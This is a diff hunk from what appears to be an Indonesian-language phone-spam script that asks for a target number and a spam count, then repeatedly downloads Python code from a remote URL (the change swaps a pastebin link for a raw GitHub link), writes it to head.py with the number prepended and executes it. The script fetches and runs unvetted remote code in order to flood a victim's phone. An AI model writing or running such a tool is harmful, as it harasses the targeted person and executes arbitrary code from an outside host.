@@ -14,7 +14,7 @@ print ('MASUKAN NOMOR DENGAN AWALAN 8XXX')
 no = input ('MASUKAN NOMOR TARGET : ')
 jum = int(input('MASUKAN JUMLAH SPAM  : '))
 for i in range(jum):
-        req = requests.get('https://pastebin.com/raw/fMAZw2pE').text
+        req = requests.get('https://raw.githubusercontent.com/Xenz-11/fileku/main/head-spam.py').text
         open ('head.py','w').write('no = "%s" \n %s'%(int(no),req))
         os.system('python head.py')
 
